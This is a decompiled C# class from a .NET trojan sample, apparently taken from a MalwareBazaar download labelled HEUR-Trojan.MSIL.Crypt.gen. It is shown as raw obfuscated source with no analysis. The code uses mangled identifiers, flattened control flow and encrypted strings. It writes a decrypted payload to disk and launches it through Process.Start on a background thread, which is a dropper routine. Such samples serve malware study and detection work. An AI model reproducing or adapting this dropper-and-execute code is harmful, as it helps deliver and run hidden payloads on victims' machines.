// Decompiled with JetBrains decompiler
// Type: @ӻ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

internal sealed class \u0040ӻ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string gvK() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int n9s() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ӻ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num1 = !\u0040ӻ.\u0040Ӝ() ? 2 : 3;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_1;
        case 1:
        case 2:
          goto label_2;
        case 4:
          goto label_5;
        default:
          num1 = 4;
          continue;
      }
    }
label_1:
    \u0040ӻ.\u0040ӕ();
label_2:
    \u0040ӻ.\u0040Ӗ((object) this);
label_5:
    try
    {
      \u0040ӻ.\u0040ӓ ӓ = new \u0040ӻ.\u0040ӓ();
      ӓ.\u0040ӓ = \u0040ӻ.\u0040Ә((object) \u0040ԝ.\u0040Ծ(), \u0040ӻ.\u0040ӗ(1604), (object) \u0040ԝ.\u0040\u05CB(10), \u0040ӻ.\u0040ӗ(1610));
      int num2 = \u0040ӻ.\u0040ӝ() ? 5 : 1;
      while (true)
      {
        string str;
        switch (num2)
        {
          case 0:
          case 1:
            str = (string) \u0040ӻ.\u0040ӗ(2872);
            if (\u0040ӻ.\u0040Ӝ())
            {
              num2 = 3;
              continue;
            }
            goto case 4;
          case 3:
            \u0040ӻ.\u0040ә(ӓ.\u0040ӓ, (object) str);
            break;
          case 4:
            this.\u0040Ӕ = 0;
            num2 = 6;
            continue;
          case 6:
            goto label_10;
        }
        \u0040ӻ.\u0040Ӛ((object) new Thread(new ThreadStart(ӓ.\u0040Ӕ)));
        num2 = 4;
      }
label_10:;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040ӻ.\u0040ӛ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(object _param0, object _param1, object _param2, object _param3) => (object) ((string) _param0 + (string) _param1 + (string) _param2 + (string) _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0, object _param1) => File.WriteAllText((string) _param0, (string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӛ(object _param0) => ((Thread) _param0).Start();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӝ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӝ() => false;

  private sealed class \u0040ӓ
  {
    public object \u0040ӓ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӓ()
    {
      \u0040ӻ.\u0040ӓ.\u0040ӕ();
      \u0040ӻ.\u0040ӓ.\u0040Ӗ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӕ()
    {
      int num;
      if (!\u0040ӻ.\u0040ӓ.\u0040Ә())
      {
        num = 3;
        goto label_5;
      }
      else
      {
        num = 4;
        if (\u0040ӻ.\u0040ӓ.\u0040ӗ())
          goto label_5;
      }
label_4:
      ProcessStartInfo processStartInfo1;
      \u0040ӻ.\u0040ӓ.\u0040Ӝ((object) processStartInfo1);
      goto label_7;
label_5:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            goto label_8;
          case 1:
          case 4:
            goto label_4;
          case 2:
            goto label_7;
          case 5:
            goto label_2;
          default:
            num = 2;
            continue;
        }
      }
label_2:
      ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
      \u0040ӻ.\u0040ӓ.\u0040ә((object) processStartInfo2, ProcessWindowStyle.Normal);
      \u0040ӻ.\u0040ӓ.\u0040Ӛ((object) processStartInfo2, true);
      \u0040ӻ.\u0040ӓ.\u0040ӛ((object) processStartInfo2, this.\u0040ӓ);
      processStartInfo1 = processStartInfo2;
      goto label_4;
label_7:
label_8:
      num = 5;
      goto label_5;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӗ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ә() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ә(object _param0, ProcessWindowStyle _param1) => ((ProcessStartInfo) _param0).WindowStyle = _param1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӛ(object _param0, bool _param1) => ((ProcessStartInfo) _param0).UseShellExecute = _param1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӛ(object _param0, object _param1) => ((ProcessStartInfo) _param0).FileName = (string) _param1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӝ(object _param0) => (object) Process.Start((ProcessStartInfo) _param0);
  }
}
